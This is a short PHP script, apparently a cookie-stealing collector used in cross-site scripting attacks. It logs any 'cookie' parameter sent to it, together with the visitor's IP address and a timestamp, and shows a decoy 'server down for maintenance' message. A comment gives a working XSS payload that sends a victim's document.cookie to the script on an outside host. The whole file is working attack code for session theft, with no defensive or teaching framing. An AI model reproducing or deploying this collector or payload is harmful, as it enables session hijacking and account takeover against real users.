<?php

$date = date('d-m-y h:i:s');
$cookie = "".$date." - ".$_SERVER['REMOTE_ADDR']." - Cookie(s) : ".$_REQUEST["cookie"]."". PHP_EOL;
$fp = fopen("cookieFetcher.log", "a+");
fwrite($fp, ''.$cookie.'');
fclose($fp);

echo "<p> Server is currently down due to a maintenance. Please try again later !"; 
// exemple of xss injection code : <script>document.location="http://192.168.130.128/cookieFetcher/cookieFetcher.php?cookie="+document.cookie</script>

exit; 

?>
